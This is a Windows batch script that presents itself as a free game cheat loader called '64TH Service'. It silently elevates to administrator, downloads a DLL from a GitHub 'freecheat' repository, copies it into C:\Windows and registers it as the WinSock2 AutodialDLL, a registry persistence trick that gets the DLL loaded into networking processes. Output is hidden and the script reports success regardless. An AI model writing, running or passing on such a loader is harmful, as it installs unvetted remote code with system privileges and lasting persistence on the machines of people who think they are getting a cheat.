@echo off
setlocal enabledelayedexpansion

:: Set console text color to green (Dark Green: 02, Bright Green: 0A)
color 0A

:: Check for administrative privileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo This script requires administrative privileges. Restarting with admin rights...
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0' -Verb RunAs"
    exit /b
)

:: Display header
echo.
echo  ==============================
echo  =        [32m64TH Service[0m        =
echo  ==============================
echo.

REM --> Set variables
set "tempFolder=%temp%\64THService"

REM --> Create the temp folder only if it does not already exist
if not exist "%tempFolder%" (
    mkdir "%tempFolder%"
)

cd "%tempFolder%"

:: Download required files
echo.
echo [32mLoading...[0m
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/64file911/freecheat/raw/refs/heads/main/kainite.dll' -OutFile '%tempFolder%\kainite.dll'" >nul 2>&1

:: Move the downloaded file to the final destination and modify registry
echo.
echo [32mInjecting cheat...[0m
timeout /t 5 >nul
move /Y "%tempFolder%\kainite.dll" "C:\Windows\" >nul 2>&1
reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\kainite.dll" /F >nul 2>&1

echo.
echo [32mOperation completed successfully.[0m

:: Automatically close the batch file after the operation completes
exit